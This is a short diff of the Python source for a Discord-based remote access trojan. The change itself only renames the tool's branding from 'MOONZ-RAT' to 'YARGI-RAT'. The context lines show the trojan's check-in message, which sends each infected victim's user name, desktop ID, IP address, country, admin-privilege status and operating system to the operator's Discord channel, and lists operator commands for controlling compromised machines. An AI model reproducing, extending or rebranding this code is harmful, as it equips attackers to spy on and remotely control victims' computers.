@@ -174,7 +174,7 @@ async def on_ready():
     await channel.send(f"""
 ||@everyone|| The RAT has sniped :flag_{cflag.lower()}: **{user}** :flag_{cflag.lower()}: with desktop ID **{host_id}**.
 
-``` MOONZ-RAT| {client.user.name} | MOONZ ADMINISTRATION ```
+``` YARGI-RAT| {client.user.name} | YARGI ADMINISTRATION ```
 
 :skull_crossbones: `->` IP Address : ||{ipaddress}|| <- :flag_{cflag.lower()}:
 :skull_crossbones: `->` Admin privileges : **{admincheck()}**
@@ -182,7 +182,7 @@ async def on_ready():
 :skull_crossbones: `->` OS : **{platform.system()} {platform.release()}**
 :skull_crossbones: `->` Usage ID : ||{clientid}||
 
-``` MOONZ RAT| {client.user.name} | MOONZ RAT ```
+``` YARGI RAT| {client.user.name} | YARGI RAT```
 
 Help menu : **!help ||{clientid}||**
 Get list of active users : **!usagelist**
